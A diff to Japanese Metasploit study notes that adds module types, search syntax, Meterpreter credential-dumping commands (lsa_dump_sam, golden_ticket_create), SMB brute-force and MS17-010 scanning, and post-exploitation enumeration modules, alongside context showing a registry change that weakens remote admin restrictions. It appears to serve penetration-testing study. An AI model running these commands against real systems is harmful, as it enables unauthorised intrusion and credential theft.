@@ -2,6 +2,16 @@
 
 ## metasploit の基礎
 
+### モジュール種別
+
+- エクスプロイト：特定の脆弱性を悪用するコード（例：exploits/windows/smb/）
+- 補助（Auxiliary）：直接的な攻撃以外のあらゆる処理を担当する
+- ペイロード：攻撃が成功した後にターゲットシステム上で実行されるコード
+- ポストエクスプロイト：アクティブなセッションを通じてターゲットへのアクセス権を既に取得した後に実行する（例：post/windows/gather/）
+- エンコーダー：ペイロードデータを別の形式に変換する（例：x86/shikata_ga_nai）
+- NOPs：何も実行しない命令のシーケンスであるNOPスレッドを生成する
+- 回避（Evasion）：Windows DefenderやAppLockerなどの特定のセキュリティ制御を回避するために特別に設計されたもの。エンコーダー（単にデータを再エンコードするだけ）とは異なり、回避モジュールは実際の回避技術を実装している。現在約12個のモジュールが含まれていてその有効性は様々。
+
 ### postgresql
 
 起動しておくと、metasploit が DB を使えるため実行速度が上がる
@@ -66,12 +76,32 @@ searchsploit rpcbind
 
 ```shell
 msf6 > search Windows
+
+# type: exploit, auxiliary, post, payload, encoder, nop, evasion
+msf6 > search type:exploit apache
+
+# platform: windows, linux, osx, android etc
+msf6 > search platform:windows apache
+
+# CVE の ID で検索
+msf > search CVE:2025-2
+
+# モジュールの説明文のみで照合
+msf > search name:flask
+```
+
+### 情報表示
+
+```sh
+msf > info 0
 ```
 
 ### エクスプロイトの切り替え
 
 ```shell
 msf6 > use <エクスプロイト>
+
+msf6 > use 0
 ```
 
 ### 戻る
@@ -350,6 +380,9 @@ exit
 background
 # 後で続けられる
 sessions -i <num>
+
+# 特定のセッションのみKillする
+sessions -k <num>
 ```
 
 ### meterpreter コマンドの一覧
@@ -419,6 +452,14 @@ meterpreter > load kiwi
 meterpreter > help
 
 meterpreter > creds_all
+```
+
+その他
+
+```
+lsa_dump_sam
+lsa_dump_secrets
+golden_ticket_create
 ```
 
 ### 永続化の例
@@ -531,6 +572,70 @@ msf exploit(test/foo) > set CMD net localgroup \"Remote Management Users\" bc100
 
 msf exploit(test/foo) > set CMD reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
+
+## スキャン
+
+```sh
+# スキャナを探す
+search type:auxiliary <service_name>
+```
+
+### ポートスキャン
+
+```sh
+msf6 > use auxiliary/scanner/portscan/tcp
+# DB保存する nmap
+msf6 > db_nmap -sV -O 10.144.143.249
+
+msf6 > hosts
+# RHOSTS に hosts の結果をセット
+msf6 auxiliary(scanner/smb/smb_login) > hosts -R
+
+msf6 > services
+msf6 > services -S webfs
+
+# 認証情報
+msf6 > creds
+
+# 外部スキャン結果のインポート
+msf6 > db_import /path/to/nmap_scan.xml
+```
+
+```sh
+# NetBIOS
+msf6 > use auxiliary/scanner/netbios/nbname
+
+# HTTP
+msf6 > auxiliary/scanner/http/http_version
+```
+
+```sh
+# SMBログインブルートフォース
+msf6 > use auxiliary/scanner/smb/smb_login
+```
+
+### 脆弱性スキャン
+
+```sh
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+
+# DBに保存された脆弱性を表示
+msf6 > vulns
+```
+
+## Postエクスプロイト
+
+```sh
+search type:post <keyword>
+```
+
+セッション作成後にセッションIDを指定して実行する
+
+- post/windows/gather/enum_domain— ドメインを列挙
+- post/windows/gather/enum_shares— ネットワーク共有の一覧
+- post/windows/gather/enum_applications— インストールされているアプリケーションの一覧を表示
+- post/multi/gather/env— 環境変数をダンプ
+- post/multi/manage/shell_to_meterpreter— 基本的なシェルセッションをMeterpreterにアップグレード
 
 ## セキュリティ視点
 
